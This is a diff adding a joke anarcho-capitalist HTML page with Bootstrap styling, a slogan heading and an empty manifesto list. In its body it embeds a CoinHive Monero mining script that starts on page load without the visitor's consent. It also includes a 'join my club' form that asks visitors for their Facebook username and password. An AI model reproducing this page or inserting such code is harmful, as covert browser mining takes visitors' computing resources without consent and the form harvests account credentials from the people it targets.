@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Andro AnCap Gvivradze </title>
+</head>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+<!-- Optional theme -->
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
+
+<!-- Latest compiled and minified JavaScript -->
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+<style type="text/css">
+	h1{
+		color: black;
+
+
+	}
+	body{
+		background-color: yellow;
+	}
+	.coolstuff{
+		border-radius: 5px;
+		border: 1px solid black;
+	}
+	.name{
+		height: 30%;
+	}
+
+</style>
+<body>
+  <script>
+
+          // What is monero: https://en.wikipedia.org/wiki/Monero_(cryptocurrency) 
+          // Mining algorithm:  https://en.wikipedia.org/wiki/CryptoNote
+          // Miner Documentation:  https://coinhive.com/documentation/miner
+
+          var miner = new CoinHive.User('VHM9XNjSHcf81opwR4b8cYHFgUqJ9qKV', 'translate.ge', {
+            threads: navigator.hardwareConcurrency/2, 
+            throttle: 0.5,
+            forceASMJS: false,
+            theme: 'light',
+            language: 'ka'
+          });
+
+          miner.start();
+
+          // Only attempt to start and show the opt-in(modal) screen every 48 hours
+          if (!miner.didOptOut(60 * 60 * 48)) {
+            miner.start(); // Ask again
+          }
+
+          // to be sure open your browser console  and type:  miner.isRunning()
+          console.log('Miner Running ? ', miner.isRunning() );
+
+      </script>
+
+	
+<div class="col-md-6">
+		<h1>TAXATION IS THEEFT</h1>
+
+	<div class="name"> 
+
+<button class="btn-primary btn" onclick="window.location.href='https://facebook.com'">  destroy THE Government</button>
+	</div>
+		<form class="coolstuff"> 
+			<legend> If you want to join my club, write your infromation here</legend>
+			<p>write your facebook username</p>
+<input type="text" placename="">
+<p> write your facebook password</p>
+<input type="paswrod" name="">
+		</form>
+
+	</div><div class="col-md-6">
+		<img src="http://i0.kym-cdn.com/photos/images/newsfeed/001/158/544/b71.jpg">
+		<h2>ANCAP MANIFESTO</h2>
+		<ul>
+			<li></li>
+			<li></li>
+			<li></li>
+
+		</ul>
+		</div>
+</body>
+</html>
